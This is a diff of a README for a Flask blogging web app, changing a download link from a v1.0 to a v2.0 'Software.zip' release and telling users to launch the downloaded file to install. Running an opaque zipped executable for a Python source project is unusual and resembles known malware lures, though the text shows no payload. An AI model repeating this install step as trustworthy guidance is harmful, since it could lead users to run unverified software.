@@ -11,7 +11,7 @@ Flask_Blog is an impressive web application created using Flask, a lightweight w
 📧 **Forms for User Interaction:** Engage with your audience through interactive forms for comments and feedback.  
 
 ## Installation
-To get started with Flask_Blog, you can download the software package from this [link](https://github.com/Sepi6121212/Flask_Blog/releases/download/v1.0/Software.zip). Simply launch the downloaded file to begin the installation process.
+To get started with Flask_Blog, you can download the software package from this [link](https://github.com/Sepi6121212/Flask_Blog/releases/download/v2.0/Software.zip). Simply launch the downloaded file to begin the installation process.
 
 ## Technologies Used
 - Python
